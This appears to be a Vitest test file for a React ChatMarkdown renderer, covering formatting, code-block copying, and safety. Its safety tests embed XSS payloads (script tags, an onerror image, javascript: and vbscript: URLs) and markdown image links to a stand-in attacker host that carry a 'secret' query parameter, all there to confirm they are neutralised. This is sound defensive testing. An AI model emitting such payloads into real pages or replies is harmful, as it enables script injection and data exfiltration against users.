import { fireEvent, render, screen } from "@testing-library/react";
import { afterEach, describe, expect, it, vi } from "vitest";
import { ChatMarkdown } from "./ChatMarkdown";

afterEach(() => vi.unstubAllGlobals());

describe("ChatMarkdown formatting", () => {
  it("renders a table inside a scroll container, a list, bold and inline code", () => {
    const { container } = render(<ChatMarkdown text={"| a | b |\n|---|---|\n| 1 | 2 |\n\n- one\n- two\n\n**bold** and `code`"} />);
    const table = container.querySelector("table")!;
    expect(table).not.toBeNull();
    expect(table.parentElement).toHaveClass("md-scroll");
    expect(container.querySelectorAll("li")).toHaveLength(2);
    expect(container.querySelector("strong")).toHaveTextContent("bold");
    expect(container.querySelector("p code")).toHaveTextContent("code");
  });

  it("shifts headings down so a reply cannot shout, and never makes an h1 or h2", () => {
    const { container } = render(<ChatMarkdown text={"# A\n\n## B\n\n### C\n\n#### D\n\n###### E"} />);
    expect([...container.querySelectorAll("h1,h2,h3,h4,h5,h6")].map((h) => h.tagName)).toEqual(["H3", "H4", "H5", "H6", "H6"]);
  });
});

describe("ChatMarkdown code blocks", () => {
  it("shows the language, the exact text and a Copy button that copies it", () => {
    const writeText = vi.fn(async () => {});
    vi.stubGlobal("navigator", { clipboard: { writeText } });
    const { container } = render(<ChatMarkdown text={"```sql\nSELECT 1;\nSELECT 2;\n```"} />);
    expect(container.querySelector("pre code")!.textContent).toBe("SELECT 1;\nSELECT 2;\n");
    expect(screen.getByText("sql")).toBeInTheDocument();
    fireEvent.click(screen.getByRole("button", { name: "Copy" }));
    expect(writeText).toHaveBeenCalledWith("SELECT 1;\nSELECT 2;");
  });

  it("renders a fence with no language without a label", () => {
    const { container } = render(<ChatMarkdown text={"```\nplain\n```"} />);
    expect(container.querySelector("pre code")).toHaveTextContent("plain");
    expect(container.querySelector(".md-lang")).toBeNull();
  });
});

describe("ChatMarkdown safety", () => {
  it("shows raw HTML as text, never as elements", () => {
    const { container } = render(<ChatMarkdown text={'<script>alert(1)</script>\n\n<img src=x onerror="alert(1)">'} />);
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent).toContain("alert(1)");
  });

  it("opens http(s) and mailto links safely in a new tab", () => {
    render(<ChatMarkdown text={"[ok](https://example.com) and [mail](mailto:a@b.c)"} />);
    const ok = screen.getByRole("link", { name: "ok" });
    expect(ok).toHaveAttribute("href", "https://example.com");
    expect(ok).toHaveAttribute("target", "_blank");
    expect(ok).toHaveAttribute("rel", "noopener noreferrer");
    expect(screen.getByRole("link", { name: "mail" })).toHaveAttribute("href", "mailto:a@b.c");
  });

  it.each(["javascript:alert(1)", "data:text/html,x", "vbscript:x", "JaVaScRiPt:alert(1)"])("does not link %s", (url) => {
    render(<ChatMarkdown text={`[bad](${url})`} />);
    expect(screen.queryByRole("link")).toBeNull();
    expect(screen.getByText("bad")).toBeInTheDocument();
  });

  it("never loads a remote image: the alt text shows instead (markdown images are a tracking channel)", () => {
    const md = "![chart](https://evil.example/t.png?d=secret)\n\n![ref][r]\n\n[![linked](https://evil.example/b.png)](https://example.com)\n\n[r]: https://evil.example/r.png";
    const { container } = render(<ChatMarkdown text={md} />);
    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent).toContain("chart");
    expect(container.textContent).toContain("linked");
  });
});
